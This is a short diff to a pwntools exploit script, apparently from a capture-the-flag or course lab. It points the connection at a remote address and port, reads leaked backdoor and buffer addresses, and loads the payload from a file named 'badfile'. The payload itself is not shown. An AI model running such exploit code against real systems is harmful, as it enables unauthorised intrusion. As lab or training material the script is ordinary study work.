@@ -4,7 +4,7 @@ from pwn import *
 # context.log_level = 'debug'
 
 # p = process('./hack')     # use this tube on your local machine
-p = remote('100', 23454)   # use this for remote attack
+p = remote('10.20.38.233', 23454)   # use this for remote attack
 
 p.recvuntil('cheater1: 0x')
 bdoor = int(p.recvline(), 16)
@@ -15,7 +15,9 @@ addr = int(p.recvline(), 16)
 p.info('local buf address: 0x%x', addr)
 
 # p.recvuntil('name? ')
-payload = ''
+# payload = input()
+with open("./badfile", "rb") as f:
+    payload = f.readline()
 
 # gdb.attach(p, 'finish\n'*6)     # for debug, use tmux or byobu
 
